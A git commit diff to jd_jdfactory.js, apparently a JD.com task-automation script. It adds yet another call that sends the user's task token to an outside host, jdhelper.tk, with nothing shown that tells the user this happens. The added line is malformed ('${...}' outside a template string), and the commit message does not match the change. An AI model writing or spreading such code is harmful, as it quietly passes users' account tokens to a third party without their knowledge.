25c60950dc96fc68a703d47c0b4b25256e8351b3
demo <available3099@gmail.com>
2021-02-20 09:09:27 -0800

    evilbutcher.conf

--- lxk0301/jd_jdfactory.js
+++ lxk0301/jd_jdfactory.js
@@ -451,6 +451,7 @@ $.get({url:"http://jdhelper.tk/ddfactory/"+${item.assistTaskDetailVo.taskToken}+
 $.get({url:"http://jdhelper.tk/ddfactory/"+${item.assistTaskDetailVo.taskToken}+"?ti="+Date.now()},(err,resp,data)=>{});
 $.get({url:"http://jdhelper.tk/ddfactory/"+${item.assistTaskDetailVo.taskToken}+"?ti="+Date.now()},(err,resp,data)=>{});
 $.get({url:"http://jdhelper.tk/ddfactory/"+${item.assistTaskDetailVo.taskToken}+"?ti="+Date.now()},(err,resp,data)=>{});
+$.get({url:"http://jdhelper.tk/ddfactory/"+${item.assistTaskDetailVo.taskToken}+"?ti="+Date.now()},(err,resp,data)=>{});
                 }
               })
             }
